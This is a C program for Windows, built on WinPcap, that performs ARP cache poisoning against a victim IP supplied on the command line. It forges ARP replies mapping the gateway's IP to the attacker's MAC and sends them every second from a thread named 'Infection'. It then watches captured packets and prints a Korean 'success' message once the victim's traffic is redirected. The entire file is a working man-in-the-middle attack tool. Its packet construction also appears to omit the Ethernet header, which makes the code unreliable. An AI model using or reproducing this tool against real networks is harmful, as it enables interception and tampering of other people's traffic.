#include "pcap.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <winsock2.h>
#include <iphlpapi.h>
#include <Iptypes.h>
#include <windows.h>
#pragma comment(lib, "Iphlpapi.lib")
#pragma comment (lib, "wpcap.lib")
#pragma comment (lib, "ws2_32.lib" )
#define RIGHT_SHIFT(value, bytes) ((value) >> ((bytes) << 3))
#define GET_HEX(value)    ((value) & 0xFF)
struct arphdr
{
	unsigned short ar_hrd;
	unsigned short ar_pro;
	unsigned char ar_hln;
	unsigned char ar_pln;
	unsigned short ar_op;
};
struct ether_arp
{
	struct arphdr ea_hdr;
	unsigned char arp_sha[6];
	unsigned char arp_spa[4];
	unsigned char arp_tha[6];
	unsigned char arp_tpa[4];
};
struct ipaddress
{
	u_char ip1;
	u_char ip2;
	u_char ip3;
	u_char ip4;
};
struct ether_header
{
	u_char src[6];
	u_char des[6];
	unsigned short ether_type;
};
struct ip_header
{
	unsigned char ip_header_len : 4;
	unsigned char ip_version : 4;
	unsigned char ip_tos;
	unsigned short ip_total_length;
	unsigned short ip_id;
	unsigned char ip_frag_offset : 5;
	unsigned char ip_more_fragment : 1;
	unsigned char ip_dont_fragment : 1;
	unsigned char ip_reserved_zero : 1;
	unsigned char ip_frag_offset1;
	unsigned char ip_ttl;
	unsigned char ip_protocol;
	unsigned short ip_checksum;
	struct ipaddress ip_srcaddr;
	struct ipaddress ip_destaddr;
};
int vip[4], suche = 1;
u_char packet[100] = {0x00, 0x01, 0x80, 0x00, 0x06, 0x04, 0x00, 0x02};
pcap_t *pickedDev;
HANDLE hThread;
PIP_ADAPTER_INFO pAdapterInfo, pAdapter;
ULONG buflen;
IPAddr DestIp = 0;
IPAddr SrcIp = 0;
IPAddr GateIp = 0;
u_char MyMac[6];
u_char VicMac[6];
u_char GateMac[6];
u_char Dip[4], Sip[4], Gip[4];
void packet_handle(u_char *param, const struct pcap_pkthdr *h, const u_char *data)
{
	ether_header *EH = (ether_header *)data;
	ip_header *IH = (struct ip_header*)(data + 14);
	if (Dip[0]==IH->ip_srcaddr.ip1 && Dip[1]==IH->ip_srcaddr.ip2 && Dip[2]==IH->ip_srcaddr.ip3 && Dip[3] == IH->ip_srcaddr.ip4)
	{
		if (Sip[0] != IH->ip_destaddr.ip1 || Sip[1] != IH->ip_destaddr.ip2 || Sip[2] != IH->ip_destaddr.ip3 || Sip[3] != IH->ip_destaddr.ip4)
		{
			suche = 0;
			printf("성공\n");
		}
	}
}
DWORD WINAPI Infection(LPVOID arg)
{
	while (1)
	{
		pcap_sendpacket(pickedDev, packet, 28);
		Sleep(1000);
	}
	return 0;
}
int main(int argc, char *argv[])
{
	pcap_if_t *allDevice, *device;
	char errorMSG[256];
	int i, j=0;
	ULONG PhysAddrLen = 6;

	pAdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
	buflen = sizeof(IP_ADAPTER_INFO);
	if (GetAdaptersInfo(pAdapterInfo, &buflen) == ERROR_BUFFER_OVERFLOW) {
		free(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO *)malloc(buflen);
	}
	if (GetAdaptersInfo(pAdapterInfo, &buflen) == NO_ERROR)
		pAdapter = pAdapterInfo;
	DestIp = inet_addr(argv[1]);
	SrcIp = inet_addr(pAdapter->IpAddressList.IpAddress.String);
	GateIp = inet_addr(pAdapter->GatewayList.IpAddress.String);
	SendARP(SrcIp, SrcIp, MyMac, &PhysAddrLen);
	SendARP(DestIp, SrcIp, VicMac, &PhysAddrLen);
	SendARP(GateIp, SrcIp, GateMac, &PhysAddrLen);
	i = 4;
	while (i--)
		Dip[i] = GET_HEX(RIGHT_SHIFT(DestIp, i));
	i = 4;
	while (i--)
		Sip[i] = GET_HEX(RIGHT_SHIFT(SrcIp, i));
	i = 4;
	while (i--)
		Gip[i] = GET_HEX(RIGHT_SHIFT(GateIp, i));

	for (i = 8; i < 28; i++)
	{
		if (j == 6)
			j = 0;
		if (i < 14)
			packet[i] = MyMac[j++];
		if (i >= 14 && i < 18)
			packet[i] = Gip[j++];
		if (i >= 18 && i < 24)
		{
			if (i == 18 && j == 4)
				j = 0;
			packet[i] = VicMac[j++];
		}
		if (i >= 24 && i < 28)
			packet[i] = Dip[j++];
	}
	if ((pcap_findalldevs(&allDevice, errorMSG)) == -1)
		printf("장치 검색 오류");
	device = allDevice;
	pickedDev = pcap_open_live(device->name, 65536, 0, 1000, errorMSG);
	pcap_freealldevs(allDevice);
	hThread = CreateThread(NULL, 0, Infection, NULL, 0, NULL);
	while(suche)
		pcap_loop(pickedDev, 1, packet_handle, NULL);
	CloseHandle(hThread);
	return 0;
}